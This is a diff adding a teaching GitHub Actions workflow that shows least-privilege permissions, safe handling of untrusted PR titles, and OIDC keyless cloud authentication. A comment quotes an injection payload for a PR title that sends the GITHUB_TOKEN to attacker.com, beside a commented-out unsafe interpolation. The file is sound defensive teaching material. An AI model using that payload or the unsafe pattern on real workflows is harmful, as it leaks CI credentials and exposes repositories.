@@ -1,0 +1,85 @@
+name: "09 · Security Patterns"
+
+# Key concepts:
+#   permissions block    — declare only what the job actually needs (least privilege)
+#   script injection     — never interpolate ${{ expressions }} directly into run: scripts
+#   OIDC keyless auth    — request short-lived cloud tokens instead of storing secrets
+#
+# Default permissions in GitHub Actions are often broader than needed.
+# Explicitly narrowing them reduces blast radius, especially on fork PRs where
+# the GITHUB_TOKEN can interact with your repo.
+
+# Workflow-level default: read-only. Individual jobs can override.
+permissions:
+  contents: read
+
+on:
+  push:
+    branches: [main]
+  workflow_dispatch:
+
+jobs:
+  # 1. Least-privilege permissions
+  # This job reads code and runs tests — it doesn't need write access to anything.
+  run-tests:
+    name: "Tests (least privilege)"
+    runs-on: ubuntu-latest
+    permissions:
+      contents: read   # explicit at job level too — belt and suspenders
+    steps:
+      - uses: actions/checkout@v4
+      - uses: actions/setup-node@v4
+        with:
+          node-version: "20"
+          cache: "npm"
+      - run: npm install
+      - run: npm test
+
+  # 2. Script injection — the safe pattern
+  injection-safe:
+    name: "Script injection — safe pattern"
+    runs-on: ubuntu-latest
+    permissions:
+      contents: read
+    steps:
+      # UNSAFE (commented out — for illustration only):
+      # An attacker sets the PR title to: `"; curl attacker.com?t=$GITHUB_TOKEN; echo "`
+      # and that shell code executes because the expression is interpolated raw.
+      #
+      # - name: UNSAFE — never interpolate user-controlled data into run:
+      #   run: echo "PR title: ${{ github.event.pull_request.title }}"
+
+      # SAFE: pass untrusted data through an environment variable.
+      # The shell treats it as a string value, not executable code.
+      - name: SAFE — use env var intermediary for untrusted data
+        env:
+          PR_TITLE: ${{ github.event.pull_request.title || 'no PR title' }}
+          ACTOR: ${{ github.actor }}
+        run: |
+          echo "PR title: $PR_TITLE"
+          echo "Triggered by: $ACTOR"
+          # $PR_TITLE is just a string here — cannot execute arbitrary commands
+
+  # 3. OIDC keyless authentication
+  # Instead of storing a static AWS/GCP/Azure secret in GitHub, the runner
+  # requests a short-lived JWT from GitHub's OIDC provider.
+  # The cloud provider verifies the JWT and issues a temporary credential.
+  # No secrets to rotate, no secrets to leak.
+  oidc-keyless-auth:
+    name: "OIDC keyless auth"
+    runs-on: ubuntu-latest
+    permissions:
+      contents: read
+      id-token: write   # this permission is what enables OIDC token requests
+    steps:
+      - name: Request OIDC token (conceptual demo)
+        run: |
+          echo "With id-token: write, this job can call:"
+          echo ""
+          echo "  uses: aws-actions/configure-aws-credentials@v4"
+          echo "  with:"
+          echo "    role-to-assume: arn:aws:iam::123456789:role/GitHubActionsRole"
+          echo "    aws-region: us-east-1"
+          echo ""
+          echo "GitHub mints a JWT, AWS verifies it via the trust policy,"
+          echo "and issues a short-lived STS credential — no static secret stored."
